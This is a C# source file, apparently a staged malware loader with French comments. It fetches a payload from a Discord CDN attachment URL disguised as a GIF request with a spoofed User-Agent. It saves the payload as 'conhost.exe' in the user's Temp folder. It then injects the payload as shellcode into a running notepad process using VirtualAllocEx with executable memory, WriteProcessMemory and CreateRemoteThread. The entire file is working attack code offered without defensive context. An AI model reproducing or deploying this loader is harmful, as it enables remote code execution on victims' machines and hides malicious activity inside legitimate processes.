using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;

namespace Stagged
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);




        static void Main(string[] args)
        {
            //Variable local AppData pour reception du fichier
            var download_path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp";

            //Variable des non de fichier
            var name_downloaded = "SourceFile.gif";
            var name_changed = "conhost.exe";

            //Web request de download du payload dans le picture.gif qui serra nommée conhost.exe dans le appdata local temp
            string remoteUri = "https://cdn.discordapp.com/attachments/742475807703957615/844344119371497522/";
            string file_name = "SourceFile.gif", myStringWebResource = null;
            WebClient myWebClient = new WebClient();
            myWebClient.Headers.Set("Content-Type", "image/gif");
            myWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1");
            myWebClient.Headers.Add("Accept-Language", "fr,fr-FR");
            myWebClient.Headers.Add("Accept-Encoding", "gzip, deflate");
            myStringWebResource = remoteUri + file_name;
            myWebClient.DownloadFile(myStringWebResource, download_path + "\\" + name_changed);

            //Remplis le tableau payload des octets du fichier télécharger
            //byte[] payload = File.ReadAllBytes(download_path + "\\" + name_changed); 
            byte[] payload = File.ReadAllBytes(download_path + "\\" + name_changed);



            Process targetProcess = Process.GetProcessesByName("notepad")[0];
            IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);
            IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(payload.Length), 0x00001000, 0x40);

            // Write the shellcode
            UIntPtr bytesWritten;
            WriteProcessMemory(process_handle, memory_allocation_variable, payload, (uint)(payload.Length), out bytesWritten);

            // Create a thread that will call LoadLibraryA with allocMemAddress as argument

            if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.Write("Injection done!");
            }
            else
            {
                Console.Write("Injection failed!");
            }
            

            string aaa = Console.ReadLine();

        }
    }
}
